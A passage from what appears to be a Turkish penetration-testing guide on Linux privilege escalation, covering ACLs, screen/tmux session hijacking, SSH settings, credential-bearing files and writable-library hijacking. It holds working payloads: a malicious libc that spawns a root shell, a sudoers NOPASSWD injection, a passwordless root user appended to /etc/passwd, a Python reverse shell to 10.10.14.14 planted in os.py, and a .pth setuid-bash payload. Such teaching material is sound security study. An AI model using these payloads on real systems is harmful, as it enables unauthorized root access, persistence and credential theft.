level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Ardından `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutunu kullanarak kötü amaçlı bir library oluşturun.

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities, **mevcut root ayrıcalıklarının bir alt kümesini bir sürece sağlar**. Bu, root **ayrıcalıklarını daha küçük ve birbirinden bağımsız birimlere böler**. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Böylece ayrıcalıkların tümü azaltılarak istismar riskleri düşürülür.\
Capabilities ve bunların nasıl kötüye kullanılabileceği hakkında **daha fazla bilgi edinmek için** aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

Bir dizinde **"execute" biti**, ilgili kullanıcının klasöre "**cd**" yapabileceği anlamına gelir.\
**"read" biti**, kullanıcının **dosyaları listeleyebileceği**; **"write" biti** ise **dosyaları silebileceği** ve yeni **dosyalar oluşturabileceği** anlamına gelir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını oluşturur ve **geleneksel ugo/rwx izinlerini geçersiz kılabilir**. Bu izinler, dosya veya dizin erişimini iyileştirerek sahip olmayan veya grubun parçası olmayan belirli kullanıcılara hak verme ya da bu hakları reddetme olanağı sağlar. Bu **ayrıntı düzeyi, daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntıya [**buradan**](https://linuxconfig.org/how-to-manage-acls-on-linux) ulaşabilirsiniz.<sup>[[19]](#references)</sup>

Bir dosya üzerinde "kali" kullanıcısına okuma ve yazma izinleri **verin**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Sistemden** belirli ACL'lere sahip dosyaları **al**:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers ek dosyalarındaki gizli ACL arka kapısı

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde `440` izinlerine sahip, root'un sahibi olduğu ancak ACL aracılığıyla düşük ayrıcalıklı bir kullanıcıya hâlâ yazma izni veren bir dosyadır.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-` gibi bir şey görürseniz, kısıtlayıcı izin bitlerine rağmen kullanıcı bir sudo kuralı ekleyebilir:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Bu, yüksek etkili bir ACL persistence/privesc yoludur; çünkü yalnızca `ls -l` çıktısını inceleyen değerlendirmelerde kolayca gözden kaçabilir.

## Açık shell oturumları

Kullanıcılar arası GNU Screen erişimi, yalnızca sürüme değil, **çalışan oturumun yapılandırmasına ve ACL'sine** bağlıdır. [GNU Screen belgelerinde](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) çok kullanıcılı destekle derlenmiş olması gerektiği belirtilir; `multiuser on` ve bir `acladd` ya da uygun bir `aclchg` izni, başka bir kullanıcının oturuma bağlanmasına olanak tanır. [Kılavuz ayrıca](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) kullanıcılar arası oturum araması için setuid-root olmasını gerektirir. Görünür, root'a ait bir socket veya tek başına bir SUID `screen` binary'si, root shell'ine bağlanılabileceğini kanıtlamaz. Bunu privilege escalation olarak değerlendirmeden önce canlı oturumun çok kullanıcılı olduğunu, mevcut kullanıcının etkin input/command iznine sahip olduğunu ve oturumdaki shell'in ayrıcalıklı sahibin yetkileriyle çalıştığını doğrulayın.

### screen sessions hijacking

**Screen oturumlarını listeleme**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen oturumlarının ele geçirilmesi - Soket konumları (bazı sistemler birini diğerinin sembolik bağlantısı olarak sunar): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Bir oturuma bağlan**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux oturumlarının ele geçirilmesi

Bu, **eski tmux sürümlerinde** yaşanan bir sorundu. Ayrıcalıksız bir kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ele geçiremedim.

**tmux oturumlarını listele**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket konumları (bazı sistemlerde biri diğerinin sembolik bağlantısı olarak sunulur) - tmux oturumlarını ele geçirme: tmux -S /tmp/dev sess ls Bu socket'i kullanarak listeleyin; bu socket'te bir tmux oturumu başlatabilirsiniz...](<../../images/image (837).png>)

**Bir oturuma bağlanın**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Örnek için **HTB'deki Valentine box**'a bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Etkilenen Debian veya türevi OpenSSL derlemeleriyle, tarihsel güvenlik açığı döneminde oluşturulan anahtarların rastgeleliği tahmin edilebilir olabilir; ana makinenin mevcut dağıtımı veya yamalı OpenSSL sürümü, eski bir anahtarın nasıl oluşturulduğunu göstermez. **Belirli anahtarı** uygun bir tarihsel kara listeye ve kaynağına göre kontrol edin. Debian [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html), public key'lerin ve `authorized_keys` dosyalarının nasıl kontrol edileceğini açıklar; [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) ise OpenSSL düzeltmesini kaydeder. Ayrıcalıklı bir hesabın `authorized_keys` dosyasındaki bir kayıt, yalnızca eşleşen private key kurtarılabiliyorsa ve geçerli SSH politikası bu anahtarın söz konusu hesap için kullanılmasına hâlâ izin veriyorsa bir ayrıcalık yükseltme ipucudur; zayıf bir **host** anahtarı tek başına login kimlik bilgisi değildir. Ele geçirilmiş anahtarları değiştirin ve eski yetkilendirmelerini kaldırın.

### SSH ilginç yapılandırma değerleri

- **PasswordAuthentication:** Parola ile kimlik doğrulamaya izin verilip verilmediğini belirtir. OpenSSH upstream varsayılanı `yes` değeridir; dağıtım yapılandırması bunu değiştirebilir.
- **PubkeyAuthentication:** Public key ile kimlik doğrulamaya izin verilip verilmediğini belirtir. Varsayılan değer `yes` şeklindedir.
- **PermitEmptyPasswords**: Parola ile kimlik doğrulamaya izin verildiğinde, sunucunun boş parola dizelerine sahip hesaplarla login olunmasına izin verip vermediğini belirtir. Varsayılan değer `no` şeklindedir.

### Login denetim dosyaları

Bu dosyalar kimin ve nasıl login olabileceğini etkiler:

- **`/etc/nologin`**: Varsa, root dışındaki kullanıcıların login olmasını engeller ve dosyadaki mesajı gösterir.
- **`/etc/securetty`**: root'un nereden login olabileceğini kısıtlar (TTY izin listesi).
- **`/etc/motd`**: Login sonrası gösterilen banner'dır (ortam veya bakım ayrıntılarını leak edebilir).

### PermitRootLogin

root'un ssh kullanarak login olup olamayacağını belirtir. OpenSSH upstream varsayılanı `prohibit-password` değeridir; dağıtım yapılandırması bunu değiştirebilir. Olası değerler:

- `yes`: root parola veya private key kullanarak login olabilir
- `without-password` veya `prohibit-password`: root yalnızca private key ile login olabilir
- `forced-commands-only`: root yalnızca private key kullanarak ve komut seçenekleri belirtilmişse login olabilir
- `no` : login olamaz

### Güvenilen SSH user sertifika yetkilileri

`TrustedUserCAKeys`, sshd'nin **user** sertifikalarını imzalamak için güvendiği public key'leri belirtir. Eşleşen private CA key düşük ayrıcalıklı bir kullanıcı tarafından okunabiliyorsa kimin sertifika alabileceğini ve bu sertifikanın hangi hesaplarda kimlik doğrulaması yapabileceğini inceleyin. `AuthorizedPrincipalsFile` veya `AuthorizedPrincipalsCommand` kabul edilen adları kısıtlayabilir; ikisi de yapılandırılmamışsa sertifika, hedef hesap adını içermelidir. `PermitRootLogin prohibit-password`, root için parola ile kimlik doğrulamayı engeller ancak sertifika ile kimlik doğrulamaya yine de izin verebilir. Bir anahtar yolunun açığa çıkması tek başına erişimi kanıtlamaz: public/private key çiftini, geçerli `Match` kurallarını, hesap politikasını, key parolasını, iptal durumunu ve kabul edilen imza algoritmalarını doğrulayın. Enumeration çıktısına private key baytlarını eklemeyin. [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) sayfasına bakın.

Bir private CA key, ayrıcalık devri kuralı kullanıcının anahtar sahibinin kimliği altında kısıtlanmamış bir [sertifika imzalayıcıyı, örneğin `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), çalıştırmasına izin veriyorsa mevcut kullanıcı tarafından **okunamasa bile** kullanılabilir. İzin verilen komut ve argümanları; imzalayıcı hesabın anahtara erişimi, geçerli sshd yapılandırmasının güvendiği public CA, hedef hesap için kabul edilen principal, sertifika geçerliliği ve hesabın login politikasıyla birlikte değerlendirin. Devredilmiş bir imzalayıcı komut veya güvenilen bir CA dosyası tek başına başka bir hesaba erişimi kanıtlamaz; pasif enumeration sırasında test sertifikası imzalamayın.

Hesap başına ayrı CA güven yolu için bkz. [SSH certificate principal delimiter confusion](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. Ana dizinle değiştirilen `%h` gibi belirteçler içerebilir. **Mutlak yollar** (`/` ile başlayan) veya **kullanıcının ana dizinine göreli yollar** belirtebilirsiniz. Örneğin:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Bu yapılandırma, "**testusername**" kullanıcısının **private** anahtarıyla oturum açmaya çalıştığınızda ssh'nin anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarında bulunanlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (passphrase olmadan!) anahtarlar bırakmak yerine **yerel SSH anahtarlarınızı kullanmanızı** sağlar. Böylece ssh ile **bir host'a** bağlanıp oradan da **başka bir host'a**, **ilk host'unuzda** bulunan **anahtarı kullanarak** geçebilirsiniz.

Bu seçeneği `$HOME/.ssh.config` dosyasında şöyle ayarlamanız gerekir:

```
Host example.com
  ForwardAgent yes
```

`Host` her seferinde kullanıcı farklı bir makineye geçtiğinde `*` ise, bu host anahtarlara erişebilir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya vermeyebilir.\
`/etc/sshd_config` dosyası `AllowAgentForwarding` anahtar sözcüğüyle ssh-agent forwarding'e **izin verebilir** veya vermeyebilir (varsayılan değer allow'dur).

Bir ortamda Forward Agent yapılandırıldığını fark ederseniz aşağıdaki sayfayı okuyun; **yetki yükseltmek için bunu kötüye kullanabilirsiniz**:

{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, **bir kullanıcı yeni bir shell başlattığında çalıştırılan scriptlerdir**. Bu nedenle, bunlardan herhangi birini **yazabilir veya değiştirebilirseniz yetki yükseltebilirsiniz**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Tuhaf bir profil betiği bulunursa **hassas bilgiler** içerip içermediğini kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir adla bulunabilir veya yedekleri olabilir. Bu nedenle, dosyaların içindeki **hash'leri** görmek için hepsini **bulmanız** ve **okuyup okuyamadığınızı kontrol etmeniz** önerilir:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyasında **password hash'leri** bulabilirsiniz.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Yazılabilir /etc/passwd

İlk olarak aşağıdaki komutlardan biriyle bir parola oluşturun.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` ile `su` komutunu kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: Makinenin mevcut güvenliğini zayıflatabilirsiniz.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOT: BSD platformlarında `/etc/passwd`, `/etc/pwd.db` ve `/etc/master.passwd` konumlarında bulunur; ayrıca `/etc/shadow`, `/etc/spwd.db` olarak yeniden adlandırılmıştır.

**Hassas dosyalara yazabiliyor musunuz** diye kontrol etmelisiniz. Örneğin, bir **servis yapılandırma dosyasına** yazabiliyor musunuz?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Örneğin, makine bir **Tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat hizmeti yapılandırma dosyasını değiştirebiliyorsanız**, şu satırları değiştirebilirsiniz:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Bir sonraki tomcat başlatıldığında backdoor'unuz çalıştırılacak.

### Klasörleri Kontrol Edin

Aşağıdaki klasörlerde yedekler veya ilginç bilgiler bulunabilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamazsınız ama yine de deneyin)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Garip Konumlar/Sahip Olunan Dosyalar

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Son dakikalarda değiştirilen dosyalar

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB dosyaları

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Okunabilir uygulama veritabanlarında, kullanıcı adları ve parola hash’leri için tablo ve sütun adlarını inceleyin. Bir hash bulmak, parolasını çözmek ve aynı parolanın yerel bir hesapta kullanıldığını kanıtlamak ayrı adımlardır; genel biçimli 32 karakterlik bir onaltılık dizge, bunun MD5 olduğunu veya hesaba erişim sağladığını çıkarsamak için yeterli değildir.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Okunabilir bir shell geçmişinde `sudo` komutunun ardından parola benzeri kısa bir satır varsa çevresindeki satırları elle inceleyin. Normal `sudo` istemine girilen parola shell geçmişine kaydedilmez; sonraki satır, geçerli bir parolanın kanıtı değil, yanlışlıkla shell'e girilmiş olabilecek bir girdidir. `.sudo_as_admin_successful` işaretçisi, mevcut yetkilendirmeyi değil, daha önce kullanıldığını kaydeder.

### Gizli dosyalar

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH'teki Script'ler/Binary'ler**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Web dosyaları**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Yedekler**

Yedekleme dizinlerindeki okunabilir dosyaları ve **adlarında** `backup` geçen dosyaları inceleyin: adı belirsiz veya uzantısı şifreli bir arşiv bile eski uygulama verilerini açığa çıkarabilir. Şifreli bir arşiv yalnızca olası bir veri ifşasıdır. Parolanın kurtarılması, içeriğin incelenmesi, bir uygulama hash’inin kurtarılması ve bu parolanın bir Unix hesabında yeniden kullanılması doğrulanması gereken ayrı adımlardır; arşivdeki bir hash, yerel oturum açmanın mümkün olduğunu göstermez.

Okunabilir sanal makine yedekleri de aynı şekilde incelenmelidir. VirtualBox `.vbox` yapılandırması, bağlı `.vdi` imajlarını belirleyebilir ve şifrelenmiş disk anahtarı meta verilerini içerebilir; [VirtualBox, şifrelenmiş veri anahtarının VM yapılandırmasında saklandığını belgeliyor](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Çevrimdışı disk incelemesi yapabilmek için hem yapılandırmaya hem de imaja erişilebilmelidir. Konuk sistemde ayrı bir anahtar gerektiren kendi [LUKS şifreleme katmanı](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) bulunabilir. Yetkili biçimde şifre çözme işleminden sonra bile eski betikler veya yapılandırmalar parola içerebilir; bunu yerel bir hesapta geçerli bir kimlik bilgisi olarak değerlendirmeden önce, kimlik bilgisinin ana bilgisayardaki bir hesap için hâlâ geçerli olduğunu ve etkin `sudo` politikasının ayrıcalıklı bir komuta izin verdiğini doğrulayın. Pasif envanter çıkarma sırasında imajları kopyalamadan, şifrelerini çözmeden veya bağlamadan yolları ve izinleri listeleyin.

Okunabilir bir arşivi incelerken herhangi bir şeyi çıkarmadan önce arşivdeki dosya adlarını listeleyin: canlı kopyalar korumalı olsa bile gizli kimlik doğrulayıcı dosyalar, kurtarma kodları veya SSH anahtarları bulunabilir. Dosya adları yalnızca bir ipucudur; içeriği ve hesaplarda yeniden kullanım olup olmadığını ayrıca doğrulayın.

Yedekleme dizinlerinde başka bir kullanıcıya ait **okunabilir arşivlere**, özellikle root’a ait arşivlere ve grup üyeliği üzerinden erişilebilenlere öncelik verin. Canlı kopya korumalı olsa bile eski bir arşiv yapılandırma veya kimlik doğrulama sırrı içerebilir. [Backrest](https://garethgeorge.github.io/backrest/) gibi yerel bir yedekleme arayüzünde hizmetin etkin hesabını ve daha düşük ayrıcalıklı bir kullanıcının yapılandırmayı okuyup okuyamadığını ya da arayüzde kimlik doğrulaması yapıp yapamadığını kontrol edin. [Hook’ları](https://garethgeorge.github.io/backrest/docs/hooks) ve [restic komut arayüzü](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto), daemon’ın dosya ve komut ayrıcalıklarıyla çalışabilir; yalnızca loopback adresini dinlemesi etkinin boyutunu belirlemez. Backrest’in `passwordBcrypt` değeri, [kimlik doğrulama kodunda](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) bulunan base64 kodlu bir bcrypt hash’idir; düz metin parola değildir. Açığa çıkan bir arşivi veya arayüzü ayrıcalık sınırı olarak değerlendirmeden önce hizmet kimliğini, kullanılabilir kimlik bilgilerini ve ilgili plana ya da depoya erişimi doğrulayın.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Parola içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **parola içerebilecek çeşitli dosyaları** arar.\
Bunu yapmak için kullanabileceğiniz **bir diğer ilginç araç** da Windows, Linux ve Mac için yerel bir bilgisayarda depolanmış çok sayıda parolayı almak üzere kullanılan açık kaynaklı bir uygulama olan [**LaZagne**](https://github.com/AlessandroZ/LaZagne)'dir.

`/etc/guacamole/guacamole.properties` okunabiliyorsa `mysql-*`, `postgresql-*` veya `sqlserver-*` veritabanı bağlantı ayarlarını inceleyin. Hesabın Guacamole JDBC tablolarını okuma yetkisi varsa `guacamole_connection_parameter`, kaydedilmiş SSH `username`, `password`, `private-key` veya `passphrase` değerlerini içerebilir. Bağlantı kimlikleri ve parametre adlarıyla başlayın, ardından yalnızca ilgili satırları inceleyin; kaydedilmiş bir değer yeniden kullanılabilir bir sır yerine dinamik bir token veya vault referansı olabilir. [Guacamole JDBC şemasına](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) ve [SSH bağlantı parametrelerine](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) bakın.

[pswm parola yöneticisi](https://github.com/Julynx/pswm#usage), varsayılan olarak `~/.local/share/pswm/pswm` konumunda şifrelenmiş bir vault depolar. Başka bir kullanıcının vault'u görünüyorsa sahipliğini ve hesabınızın gerçekten okuyup okuyamadığını kontrol edin. Vault yolu tek başına kimlik bilgilerini ortaya çıkarmaz; ana parolasını kurtarmak, yeniden kullanılabilir bir hesap parolası bulmak ve bu hesabın ayrıcalıklarını doğrulamak ayrı adımlardır.

[Passpie'nin varsayılan veritabanı](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) `.keys` keyring'i ve grup dizinlerinde şifrelenmiş `.pass` kimlik bilgisi dosyalarıyla birlikte `~/.passpie/` konumundadır. Görülebilen bir veritabanı dizini yalnızca bir yol ipucudur: anahtara ve ilgili şifrelenmiş girdiye erişimi, gerekli olabilecek ana parola ifadesini ve kurtarılan bir kimlik bilgisinin daha fazla ayrıcalığa sahip bir hesaba ait olup olmadığını doğrulayın. Passpie ayrıca [özel veritabanı yollarını](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) da destekler; bu nedenle varsayılan yol kapsamlı değildir. Otomatik numaralandırma, kimlik bilgilerini dışa aktarmadan veya anahtar materyalini yazdırmadan metadata'yı listelemelidir.

### Günlükler

Günlükleri okuyabiliyorsanız, içlerinde **ilginç/gizli bilgiler** bulabilirsiniz. Günlük ne kadar tuhafsa o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, "**kötü**" yapılandırılmış bazı (arka kapı içeren?) **audit logları**, bu yazıda açıklandığı gibi **parolaları audit loglarına kaydetmenize** izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

**Logları okumak için** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) grubu gerçekten faydalı olacaktır.

### Shell dosyaları

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Genel Creds Arama/Regex

Ayrıca adında veya **içeriğinde** "**password**" kelimesi geçen dosyaları aramalı; loglarda IP'leri ve e-postaları, ayrıca hash regex'lerini kontrol etmelisiniz.\
Bunların hepsini nasıl yapacağınızı burada anlatmayacağım; ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından gerçekleştirilen son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Bir python betiğinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** ya da python kütüphanelerini **değiştirebiliyorsanız**, OS kütüphanesini değiştirip backdoor ekleyebilirsiniz (python betiğinin çalıştırılacağı yere yazabiliyorsanız os.py kütüphanesini kopyalayıp yapıştırın).

**Kütüphaneye backdoor eklemek** için os.py kütüphanesinin sonuna şu satırı eklemeniz yeterlidir (IP ve PORT değerlerini değiştirin):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` Tarafından İşlenen Yazılabilir `.pth`

`site.addsitedir(DIR)` ifadesini `sys.path.append(DIR)` ile eşdeğer kabul etmeyin. Bu ifade, `DIR` içindeki tüm `*.pth` dosyalarını da işler. `import` ile başlayıp ardından boşluk veya sekme gelen satırlar Python kodu olarak çalıştırılır. Yol satırları ise site dizinine göre çözümlenir ve yalnızca mevcutlarsa eklenir.<sup>[[38]](#references)</sup>

Sudo ile çalıştırılmasına izin verilen veya başka şekilde ayrıcalıklı bir Python programı, mevcut kullanıcı ya da gruplarından biri tarafından yazılabilir bir dizinde `site.addsitedir()` çağırdığında bu durum privilege escalation'a yol açar. `.pth` kodu, ayrıcalıklı program import path'ini ayarlarken, programın normal eylemi başlatılmadan önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Çalıştırılabilir `.pth` içeriği tek satıra sığmalıdır, ancak noktalı virgüller birden fazla ifadeye izin verir. Örneğin, root yetkileriyle çalışan bir yol setuid bir Bash kopyası oluşturabilir; etkin kimliğini koruması için Bash'i `-p` ile çalıştırın.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` seçeneği yalnızca Python'ın otomatik `site` başlatmasını devre dışı bırakır. Açıkça `site` içe aktarıp `site.addsitedir()` çağıran bir programı korumaz. Saldırganların yazabildiği dizinleri ayrıcalıklı içe aktarma yollarından kaldırın; dizinin ve `.pth` dosyalarının yalnızca ayrıcalıklı yöneticiye ait olduğundan ve yalnızca onun tarafından yazılabildiğinden emin olun.<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate istismarı

